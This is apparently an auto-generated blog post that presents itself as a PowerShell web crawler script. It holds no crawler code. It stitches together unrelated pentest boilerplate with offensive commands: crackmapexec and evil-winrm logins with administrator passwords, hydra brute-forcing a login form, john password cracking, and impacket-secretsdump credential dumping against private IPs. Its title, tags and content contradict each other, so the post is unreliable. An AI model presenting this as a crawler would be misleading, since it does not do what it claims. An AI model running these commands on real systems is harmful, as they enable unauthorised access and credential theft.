---
TitleSEO: "Web Crawler and Spider in PowerShell | ZureFX"
TitlePost: "Web Crawler and Spider — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for web crawler and spider. Built for security research and automation."
Keywords: "powershell, rust, scanner, python"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-559.html"
URL_IMAGES: ""
Date: "2025-04-24"
Tags: "PowerShell, Rust, Scanner, Python"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-559"
Permalink: "/scripting/script-web-crawler-and-spider-559.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `burpsuite`
- `GetUserSPNs`
- `enum4linux`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
crackmapexec smb 10.101.187.79 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.75.20.33 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.25.5.28 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.94.137.7 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.21.236 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.3.141
feroxbuster -h
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 2.59s
```
